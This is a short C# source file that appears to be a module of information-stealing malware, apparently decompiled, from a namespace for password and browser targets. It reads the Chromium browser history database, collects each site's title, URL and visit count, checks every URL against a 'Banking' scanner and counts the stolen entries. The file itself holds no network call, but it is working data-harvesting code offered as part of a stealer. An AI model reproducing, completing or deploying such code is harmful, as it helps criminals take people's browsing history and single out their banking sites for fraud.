using System;
using System.Collections.Generic;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Browsers.Chromium;

internal sealed class History
{
	public static List<Site> Get(string sHistory)
	{
		try
		{
			List<Site> list = new List<Site>();
			SQLite sQLite = SqlReader.ReadTable(sHistory, "urls");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Site item = default(Site);
				item.sTitle = Crypto.GetUTF8(sQLite.GetValue(i, 1));
				item.sUrl = Crypto.GetUTF8(sQLite.GetValue(i, 2));
				item.iCount = Convert.ToInt32(sQLite.GetValue(i, 3)) + 1;
				Banking.ScanData(item.sUrl);
				Counter.History++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<Site>();
		}
	}
}
